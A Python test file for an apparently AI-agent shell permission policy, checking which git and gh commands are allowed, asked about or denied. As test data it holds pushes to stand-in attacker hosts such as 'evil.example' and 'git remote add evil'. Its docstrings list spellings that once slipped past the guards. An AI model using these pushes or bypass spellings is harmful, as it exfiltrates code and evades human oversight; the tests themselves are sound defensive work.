"""The offered vocabulary decides, and its parameters move exactly one verdict.

A group that shipped nothing was not neutral: an empty table matches no
command, an unmatched command is unjudged, and unjudged resolves to a deny.
The first test pins that the defaults produce a usable agent rather than one
that refuses to list a directory.

The rest pin the parameters. Each exists because a reasonable project answers
differently, so each has to change the verdict it names and leave its
neighbours alone — a parameter that also moved something else would be a fork
wearing an argument's clothes.
"""

from lup.policy.kernel.decision import KernelDecision
from lup.policy.kernel.shell import decide_shell
from lup.policy.shell_rules import ShellCommandRule, erase_shell_rules
from lup.policy.vocabulary import (
    default_vocabulary,
    gh_rule,
    git_rule,
    read_only_rules,
)


def verdict(command: str, rules: list[ShellCommandRule]) -> KernelDecision:
    """Classify one command against a composed vocabulary."""
    return decide_shell(command, erase_shell_rules(rules))


def test_the_offered_defaults_produce_an_agent_that_can_read() -> None:
    """Shipping no vocabulary denied every command, which is not no policy."""
    rules = default_vocabulary()

    assert verdict("ls -la", rules).effect == "allow"
    assert verdict("grep -rn needle src", rules).effect == "allow"
    assert verdict("git status", rules).effect == "allow"
    assert verdict("gh pr list", rules).effect == "allow"
    # Generosity for reads is not generosity for losses.
    assert verdict("rm notes.md", rules).effect == "ask"
    assert verdict("sudo apt install x", rules).effect == "ask"
    # And an empty table is what a library shipping no vocabulary gives: a
    # prompt on every command, which is a working agent nobody can stand
    # rather than one that cannot run.
    assert verdict("ls -la", []).effect == "ask"


def test_git_s_object_store_queries_are_reads() -> None:
    """Probing a merge is how an agent checks a branch before touching it.

    `git merge-tree` was refused as "not classified as read-only or
    reversible" while the resolver's own refresh ran it to predict every
    lease merge — so nothing an agent could run reproduced what the tool
    it was operating had just decided.
    """
    rules = default_vocabulary()

    assert verdict("git merge-tree --write-tree dev HEAD", rules).effect == "allow"
    assert verdict("git hash-object -w blob.py", rules).effect == "allow"
    assert verdict("git patch-id --stable", rules).effect == "allow"
    assert verdict("git check-ref-format --branch x", rules).effect == "allow"
    assert verdict("git verify-pack -v pack.idx", rules).effect == "allow"


def test_sweeping_the_queries_left_what_loses_work_alone() -> None:
    """A read-only sweep that widened a destructive verb would be a bug."""
    rules = default_vocabulary()

    assert verdict("git push --delete origin dev", rules).effect == "ask"
    assert verdict("git reset --hard HEAD~1", rules).effect == "ask"
    assert verdict("git clean -fdx", rules).effect == "ask"


def test_an_empty_group_replaces_the_offered_words_rather_than_adding_to_them() -> None:
    """The words are a parameter default, so passing any replaces all of them."""
    assert verdict("ls", read_only_rules()).effect == "allow"
    assert verdict("ls", read_only_rules(["cat"])).effect == "ask"
    assert verdict("cat f", read_only_rules(["cat"])).effect == "allow"


def test_integration_branches_move_only_the_leased_force_onto_them() -> None:
    """A lease onto a feature branch allows; onto a declared shared one it asks.

    A review flow republishes its own branch every round, and a lease
    replaces only what this checkout last saw, so that force is ordinary.
    The parameter names the branches other people build on, and moves the
    leased force onto those and nothing else: an unconditional force, a push
    naming no branch, and a removal ask whatever it names.
    """
    offered = [git_rule()]
    two_tier = [git_rule(integration_branches=("main", "dev"))]

    for rules in (offered, two_tier):
        assert verdict("git push --force-with-lease origin feat", rules).effect == (
            "allow"
        )
        assert verdict("git push --force-with-lease origin main", rules).effect == (
            "ask"
        )
        assert verdict("git push --force origin feat", rules).effect == "ask"
        assert verdict("git push -f origin feat", rules).effect == "ask"
        assert verdict("git push --force-with-lease origin", rules).effect == "ask"
        assert verdict("git push -u origin HEAD", rules).effect == "allow"
        assert verdict("git push --delete origin old", rules).effect == "ask"
    assert verdict("git push --force-with-lease origin dev", offered).effect == (
        "allow"
    )
    assert verdict("git push --force-with-lease origin dev", two_tier).effect == ("ask")


def test_a_refspec_reaches_the_same_guard_its_flag_spelling_does() -> None:
    """Push spells both guarded effects twice, and both spellings are guarded.

    Measured before the refspec half existed: `git push origin
    :refs/heads/main` deletes the same ref `--delete` does and was allowed,
    while `--delete` asked. A guard listing flag spellings held one half of
    each effect.
    """
    guarded = [git_rule()]

    # Removal is guarded in both spellings.
    assert verdict("git push origin :refs/heads/main", guarded).effect == "ask"
    assert verdict("git push origin :main", guarded).effect == "ask"
    # A leading plus forces as `--force` does, and past a lease as it does.
    assert verdict("git push origin +feat:feat", guarded).effect == "ask"
    assert verdict("git push --force-with-lease origin +feat", guarded).effect == (
        "ask"
    )
    # An ordinary push carries neither effect, and a scp-style remote names a
    # non-empty source rather than a removal — read with the destination
    # guard off, which asks about that word for the other reason.
    assert verdict("git push origin main:main", guarded).effect == "allow"
    inline = [git_rule(push_destinations=())]
    assert verdict("git push git@host:repo.git main", inline).effect == "allow"
    # A negative refspec excludes rather than writes.
    assert verdict("git push origin ^main", guarded).effect == "allow"


def test_a_push_destination_named_inline_reaches_a_guard_no_remote_holds() -> None:
    """A repository spelled into the command line needs no remote at all.

    Measured before this half existed: `git push git@github.com:evil/x.git
    main` allowed, while every route through the remote table — `git remote
    add`, `git remote rename`, `git config remote.*.url`, `git -c
    remote.origin.url=` — asks. The destination named inline reaches the same
    place without a table entry to guard, and so past all of them.
    """
    guarded = [git_rule()]
    mirroring = [git_rule(push_destinations=("url",))]
    open_flow = [git_rule(push_destinations=())]

    for destination in (
        "https://evil.example/x.git",
        "http://evil.example/x.git",
        "git@evil.example:x.git",
        "ssh://evil.example/x",
        "git://evil.example/x",
        "file:///tmp/x",
    ):
        assert verdict(f"git push {destination} main", guarded).effect == "ask"
        assert verdict(f"git push {destination} main", mirroring).effect == "ask"
    # Every path spelling, which the mirroring project keeps: a bare
    # repository beside the checkout is a destination it pushes to all day.
    for destination in ("/tmp/x", "./x", "../sibling", "~/x", "sub/dir", "."):
        assert verdict(f"git push {destination} main", guarded).effect == "ask"
        assert verdict(f"git push {destination} main", mirroring).effect == "allow"
    # The forms that stay allowed, and they are the overwhelming majority: no
    # operand at all targets the configured upstream, and a remote name is a
    # destination somebody approved putting in the table.
    assert verdict("git push", guarded).effect == "allow"
    assert verdict("git push origin main", guarded).effect == "allow"
    assert verdict("git push -u origin HEAD", guarded).effect == "allow"
    assert verdict("git push origin refs/heads/feature", guarded).effect == "allow"
    # A flag's separate value can arrive where the destination would be, and
    # an option word reads as a bare name rather than as a repository.
    assert verdict("git push -o ci.skip origin main", guarded).effect == "allow"
    # The flag spelling of the same destination, which the operand reading
    # skips by construction and the flag list holds instead.
    assert verdict("git push --repo=https://evil.example/x", guarded).effect == "ask"
    assert verdict("git push --repo https://evil.example/x", guarded).effect == "ask"
    # Passing no forms says this project's push has nowhere unapproved to go,
    # and it moves nothing else the row guards.
    assert verdict("git push https://evil.example/x main", open_flow).effect == "allow"
    assert verdict("git push --delete origin main", open_flow).effect == "ask"


def test_redirect_checkout_chooses_between_asking_and_naming_the_newer_verbs() -> None:
    """Off, checkout asks because `checkout -- <path>` discards work.

    On, it denies and says which verbs replaced it. The ref-sourced form is
    recognized ahead of the row: granted where checkout asks, because a named
    commit still holds the content, and refused where it is redirected, with
    the `git restore --source` that does the same.
    """
    asking = [git_rule()]
    redirecting = [git_rule(redirect_checkout=True)]
    restored = verdict("git checkout HEAD~1 -- src/x.py", redirecting)

    assert verdict("git checkout main", asking).effect == "ask"
    assert verdict("git checkout main", redirecting).effect == "deny"
    assert "git switch" in verdict("git checkout main", redirecting).reason
    assert verdict("git checkout HEAD~1 -- src/x.py", asking).effect == "allow"
    assert restored.effect == "deny"
    assert "git restore --source=HEAD~1 -- src/x.py" in restored.recovery


def test_the_git_family_is_drawn_by_what_a_verb_reaches_not_by_what_it_writes() -> None:
    """One criterion decides the table: no ref, no index, no working tree.

    Asking whether a subcommand writes bytes draws the line in the wrong
    place. `merge-tree --write-tree` writes an object and is how a session
    asks whether two branches still merge, while `read-tree` writes nothing
    a caller sees and replaces the index wholesale. What separates them is
    reach, so the sweep is by reach — and a word arriving on the list for any
    other reason is what this pins against.
    """
    rules = [git_rule()]

    def effect(command: str) -> str:
        return verdict(command, rules).effect

    # Constructing an object moves no ref, so nothing points at the result and
    # nothing needs undoing.
    assert effect("git merge-tree --write-tree main dev") == "allow"
    assert effect("git hash-object -w README.md") == "allow"
    assert effect("git commit-tree -m x HEAD^{tree}") == "allow"
    # Each of the three clauses, refused by a verb that trips only that one.
    assert effect("git read-tree HEAD") == "deny"
    assert effect("git update-ref refs/heads/x HEAD") == "deny"
    assert effect("git format-patch HEAD~1") == "deny"
    # A ref write spelled as a second operand is still a ref write.
    assert effect("git symbolic-ref HEAD") == "allow"
    assert effect("git symbolic-ref HEAD refs/heads/topic") == "ask"
    assert effect("git symbolic-ref --delete HEAD") == "ask"
    # Passing the criterion settles the effect, and the placement is nobody's
    # to state here: a summary of what a remote would pull is built by asking
    # that remote, so what it needs is a boundary with a route out — declared
    # and measured with the profile — rather than the launcher's host, which
    # would put a reviewed crossing in front of a read.
    reaching = verdict("git request-pull main https://x.test/r HEAD", rules)
    assert (reaching.effect, reaching.sandbox) == ("allow", "ambient")


def test_a_config_write_asks_only_where_the_key_names_a_program() -> None:
    """A question is only answerable while its stated reason holds.

    The row's reason is that `git config` can change how commands execute,
    which is true of `core.hooksPath` and false of `user.email` or of the
    base branch this repository records per worktree. Asking about all of
    them spent the question on writes it did not describe, which is how a
    prompt becomes something to click through rather than to read.
    """
    rules = default_vocabulary()

    assert verdict("git config --local core.hooksPath /tmp/x", rules).effect == "ask"
    assert verdict("git config --local alias.co checkout", rules).effect == "ask"
    assert verdict("git config merge.ours.driver true", rules).effect == "ask"
    assert verdict("git config --local credential.helper store", rules).effect == "ask"
    assert verdict("git config --local branch.x.lup-base dev", rules).effect == "allow"
    assert verdict("git config user.email a@b.invalid", rules).effect == "allow"
    assert verdict("git config --get core.hooksPath", rules).effect == "allow"


def test_a_config_key_this_cannot_read_holds_the_question() -> None:
    """Absence is the test, so an illegible word has to fail closed.

    `git config --local "$KEY" v` names whatever the variable holds, and a
    de-escalation resting on "no guarded key is present" would really be
    resting on "none was readable". `--file` is the same gap spelled as a
    destination: the key reads as ordinary and the write lands elsewhere.
    """
    rules = default_vocabulary()

    assert verdict('git config --local "$KEY" value', rules).effect == "ask"
    assert verdict("git config --file /tmp/x user.name y", rules).effect == "ask"
    # The same gap from the other side: `--edit` opens every key in the file
    # and names none, so no absence test can see what it writes.
    assert verdict("git config --edit", rules).effect == "ask"
    assert verdict("git config --global -e", rules).effect == "ask"


def test_a_guarded_config_key_is_matched_without_regard_to_case() -> None:
    """Git resolves a key's section and name case-blind, so a guard must too.

    `core.hooksPath` is the spelling git's own documentation uses and
    `core.hookspath` is the same key; a guard comparing literally would catch
    whichever one it was written with and wave the other past.
    """
    rules = default_vocabulary()

    assert verdict("git config CORE.HOOKSPATH /tmp/x", rules).effect == "ask"
    assert verdict("git config Core.Pager less", rules).effect == "ask"


def test_a_write_that_retargets_the_repository_asks_in_every_spelling() -> None:
    """One operation spelled two ways was answered two ways.

    `git remote set-url origin <url>` asked and `git config remote.origin.url
    <url>` allowed, which is the same byte written to the same file. It is
    also what `gh` reads to decide which repository an issue comment, a close
    or a pull request is about, so the allowed spelling aimed the whole
    compensable forge band at any repository on the forge without a question
    anywhere in the chain -- while `--repo`, the flag that says the same thing
    out loud, was guarded.
    """
    rules = default_vocabulary()

    def effect(command: str) -> str:
        return verdict(command, rules).effect

    for spelling in (
        "git remote set-url origin git@github.com:evil/x.git",
        "git config remote.origin.url git@github.com:evil/x.git",
        "git config --local remote.origin.url x",
        "git config --global remote.origin.url x",
        "git config --file /tmp/c remote.origin.url x",
        "git config --add remote.upstream.url x",
        "git config --unset remote.origin.url",
        "git config --replace-all remote.origin.url x",
        "git config remote.origin.pushurl x",
        "git config REMOTE.Origin.URL x",
        "git -c remote.origin.url=x push",
    ):
        assert effect(spelling) == "ask", spelling
    # Reading where this repository points is how an agent finds out whose
    # work it is on, and nothing about a read moves the destination.
    for reading in (
        "git config --get remote.origin.url",
        "git config --get-all remote.origin.url",
        "git config --get-regexp remote.*",
        "git config --list",
        "git remote -v",
        "git remote get-url origin",
    ):
        assert effect(reading) == "allow", reading
    # And the guard is about destinations rather than about `git config`: a
    # write recording a fact is the same allow it was, and so is one choosing
    # among the remotes the table already holds.
    for unrelated in (
        "git config user.email a@b.invalid",
        "git config --global user.name x",
        "git config --local branch.x.lup-base dev",
        "git config remote.pushdefault upstream",
        "git -c color.ui=false status",
    ):
        assert effect(unrelated) == "allow", unrelated


def test_config_retargeting_keys_moves_only_the_destination_writes() -> None:
    """The parameter a project scoped elsewhere can decline.

    Passing none of them puts the remote-url writes back where the rest of
    `git config` sits, and leaves the executing keys and every other row
    answering exactly as they did.
    """
    guarded = [git_rule()]
    open_table = [git_rule(config_retargeting_keys=())]

    assert verdict("git config remote.origin.url x", guarded).effect == "ask"
    assert verdict("git config remote.origin.url x", open_table).effect == "allow"
    assert verdict("git -c remote.origin.url=x push", open_table).effect == "allow"
    # Its neighbours do not move with it.
    assert verdict("git config core.hooksPath /tmp/x", open_table).effect == "ask"
    assert verdict("git config user.email a@b.invalid", guarded).effect == "allow"
    # Nor does the verb that spells the same write, which states the effect
    # itself rather than reading it off a key list.
    assert verdict("git remote set-url origin x", open_table).effect == "ask"


def test_putting_a_destination_in_the_remote_table_asks() -> None:
    """Adding and renaming decide where later work goes, so they join set-url.

    `git remote add` does not retarget `origin` -- git refuses the name while
    one exists -- so the `gh` argument does not reach it. What reaches it is
    that `git push <name>` at a named remote allows, so `git remote add` was
    the entire approval a copy of this repository into somebody else's needed.
    Renaming is the other half: with two remotes defined, moving `origin` off
    one name and onto the other retargets `gh` using no other verb.
    """
    rules = default_vocabulary()

    def effect(command: str) -> str:
        return verdict(command, rules).effect

    assert effect("git remote add evil git@github.com:someone/else.git") == "ask"
    assert effect("git remote rename origin upstream") == "ask"
    assert effect("git remote set-url --add origin x") == "ask"
    assert effect("git remote remove origin") == "ask"
    # Reporting the table, and choosing which of its branches are tracked,
    # move no destination.
    assert effect("git remote show origin") == "allow"
    assert effect("git remote set-branches origin main") == "allow"


def test_a_global_that_moves_git_to_another_tree_is_not_itself_a_question() -> None:
    """The criterion is about refs, index and working tree — not about whose.

    A directory redirect is a value flag: the parser steps over its argument
    and the verb behind it is answered by its own row in the other tree, as
    `cd /tmp/o && git commit` always was by two segments. The reflog that
    makes the commit reversible is that tree's, and undoes it as this one's
    would. What still asks is a global that changes how git runs or what a
    ref means, which no `cd` spells.
    """
    rules = [git_rule()]

    def effect(command: str) -> str:
        return verdict(command, rules).effect

    assert effect("git -C /tmp/other commit -am x") == "allow"
    assert effect("git --git-dir=/tmp/x --work-tree=/tmp add .") == "allow"
    assert effect("git -C /tmp/o status") == "allow"
    # The verb keeps its own answer wherever it runs, question or not.
    assert effect("git -C /tmp/o merge --abort") == "allow"
    assert effect("git -C /tmp/o push --force origin x") == "ask"
    assert effect("git --namespace=other push") == "ask"
    assert "cd into" not in verdict("git --namespace=o push", rules).recovery
    # Forcing the pager moves nothing, and the program it names is reachable
    # only through the globals that already ask.
    assert effect("git --paginate diff") == "allow"
    assert effect("git --no-pager log") == "allow"


def test_allow_authoring_moves_only_the_author_describing_their_own_work() -> None:
    """Opening and titling a PR is authoring; commenting reaches other people."""
    authoring = [gh_rule()]
    publishing = [gh_rule(allow_authoring=False)]

    assert verdict("gh pr create --fill", authoring).effect == "allow"
    assert verdict("gh pr create --fill", publishing).effect == "ask"
    assert verdict("gh pr ready", authoring).effect == "allow"
    assert verdict("gh pr ready", publishing).effect == "ask"
    # Reads and the verbs that reach reviewers stay where they were.
    assert verdict("gh pr view 12", authoring).effect == "allow"
    assert verdict("gh pr view 12", publishing).effect == "allow"
    assert verdict("gh pr merge 12", authoring).effect == "allow"
    assert verdict("gh pr merge 12", publishing).effect == "allow"
    # The grant says the work is the author's own and the branch is already
    # pushed. Pointing the verb at another repository denies both, under either
    # setting of the parameter — and a read there is still just a read.
    assert verdict("gh pr create -R other/victim --fill", authoring).effect == "ask"
    assert verdict("gh pr create -R other/victim --fill", publishing).effect == "ask"
    assert verdict("gh pr view -R other/repo 12", authoring).effect == "allow"


def test_allow_filing_moves_only_a_new_issue_on_this_repository() -> None:
    """A report on the project's own tracker, or a publication worth a question.

    The tracker exists to receive this project's reports, so filing one there
    allows by default; a project whose issues reach people it would rather
    ask about first turns it off. Either way another repository's tracker is
    somebody else's, and asks.
    """
    filing = [gh_rule()]
    publishing = [gh_rule(allow_filing=False)]

    assert verdict("gh issue create --title x", filing).effect == "allow"
    assert verdict("gh issue create --title x", publishing).effect == "ask"
    for elsewhere in ("-R", "--repo"):
        command = f"gh issue create {elsewhere} other/x --title x"
        assert verdict(command, filing).effect == "ask", command
        assert verdict(command, publishing).effect == "ask", command
    # The verbs working an existing issue stay where they were, and the pull
    # request authoring the other parameter decides is untouched.
    assert verdict("gh issue edit 3 --title x", publishing).effect == "allow"
    assert verdict("gh issue close 3", publishing).effect == "allow"
    assert verdict("gh pr create --fill", publishing).effect == "allow"


def test_compensable_collaboration_allows_and_the_events_do_not() -> None:
    """The band a read/write split could not draw.

    Opening a pull request, retitling it, commenting, closing and reopening
    are each restored by a normal follow-up operation, and a review round
    performs several of them; the merge that lands it is the workflow's own
    last step. Filing an issue here is restored the same way, by closing it.
    A merge past the branch's protection overrides it, an approving review
    says something in the caller's name, and a release publishes — none of
    which a later action undoes, whatever it compensates.
    """
    rules = [gh_rule()]

    def effect(command: str) -> str:
        return verdict(command, rules).effect

    for allowed in (
        "gh pr create --fill",
        "gh pr edit 12 --title x",
        "gh pr comment 12 --body x",
        "gh pr close 12",
        "gh pr reopen 12",
        "gh pr merge 12",
        "gh pr merge 12 --squash --delete-branch",
        "gh issue create --title x",
        "gh issue edit 3 --title x",
        "gh issue comment 3 --body x",
        "gh issue close 3",
        "gh issue reopen 3",
    ):
        assert effect(allowed) == "allow", allowed

    for asked in (
        "gh pr merge 12 --admin",
        "gh release create v1",
        "gh secret set TOKEN",
        "gh repo edit --visibility public",
        "gh workflow run deploy.yml",
    ):
        assert effect(asked) == "ask", asked


def test_an_attestation_is_not_compensable_even_though_it_can_be_dismissed() -> None:
    """What a review did was say something in the caller's name.

    Saying something else later is not unsaying it, which is why the two
    verdict-carrying spellings ask and the one that carries neither allows.
    Both short forms are guarded beside the long ones, because a guard written
    as one spelling of an effect holds half of it — the shape a push guard had
    before refspec grammar was read structurally.
    """
    rules = [gh_rule()]

    assert verdict("gh pr review 12 --comment --body x", rules).effect == "allow"
    assert verdict("gh pr review 12 --approve", rules).effect == "ask"
    assert verdict("gh pr review 12 -a", rules).effect == "ask"
    assert verdict("gh pr review 12 --request-changes --body x", rules).effect == "ask"
    assert verdict("gh pr review 12 -r --body x", rules).effect == "ask"


def test_a_deletion_nested_in_an_allowed_operation_survives_it() -> None:
    """A safe outer verb cannot erase an unsafe inner one.

    Closing restores by reopening; the branch it deletes on the way out does
    not, and no reopen brings it back. The same shape as a push whose refspec
    deletes while its flags say nothing.
    """
    rules = [gh_rule()]

    assert verdict("gh pr close 12", rules).effect == "allow"
    assert verdict("gh pr close 12 --delete-branch", rules).effect == "ask"
    assert verdict("gh pr close 12 -d", rules).effect == "ask"


def test_what_reaches_outside_this_repository_is_answered_by_a_person() -> None:
    """A supervisor reads code; it does not carry a publication.

    Publication, repository security, and spending default to the person who
    launched the run. A quality checkpoint is the deliberate exception and
    lives on the edit gates, where what is being reviewed is how code reads.
    """
    rules = [gh_rule()]

    for command in (
        "gh release create v1",
        "gh secret set TOKEN",
        "gh repo edit --visibility public",
    ):
        assert verdict(command, rules).reviewer == "human_only", command


def test_every_gh_question_says_which_rule_reached_it() -> None:
    """An ask nobody can attribute is one nobody can tune.

    Measured before rule ids existed: 860 asks with no recorded reason at all,
    and a native tool name that answers `Bash` for every one of them.
    """
    asked = verdict("gh pr merge 12 --admin", [gh_rule()])

    assert asked.rule == "shell:gh.pr.merge"
    assert asked.evaluator == "shell-vocabulary"
    assert asked.purpose == "external_consequence"


def test_a_dry_run_flag_turns_a_guarded_verb_into_a_probe() -> None:
    """The probe form performs nothing, so the loss the row guards is not there.

    Stronger than a read verb on purpose: `git push --dry-run --force`
    replaces no ref however the rest of the line reads, so the probe stands
    beside the guarded flag and the refspec grammar alike.
    """
    rules = [git_rule()]

    assert verdict("git clean -n", rules).effect == "allow"
    assert verdict("git clean --dry-run", rules).effect == "allow"
    assert verdict("git rm -n stale.txt", rules).effect == "allow"
    assert verdict("git push --dry-run origin main", rules).effect == "allow"
    assert verdict("git push --dry-run --force origin main", rules).effect == "allow"
    assert verdict("git push --dry-run origin +main:main", rules).effect == "allow"
    # The probe changes nothing about the commands it probes for.
    assert verdict("git clean -fd", rules).effect == "ask"
    assert verdict("git rm stale.txt", rules).effect == "ask"
    assert verdict("git push --force origin main", rules).effect == "ask"


def test_a_probe_flag_inside_a_cluster_keeps_the_question() -> None:
    # `-fdxn` carries the probe, but reading it out of a cluster means
    # reading every cluster, and a misread here relaxes the one git verb
    # whose losses no snapshot holds. The miss costs a question that was
    # not owed rather than files that were.
    assert verdict("git clean -fdxn", [git_rule()]).effect == "ask"


def test_a_probe_still_asks_where_it_would_reach_an_inline_destination() -> None:
    # A dry-run push still contacts the repository it names, so naming one
    # inline stays the question it was: about a place, not a write.
    probed = verdict(
        "git push --dry-run https://example.test/repo.git main", [git_rule()]
    )
    assert probed.effect == "ask"
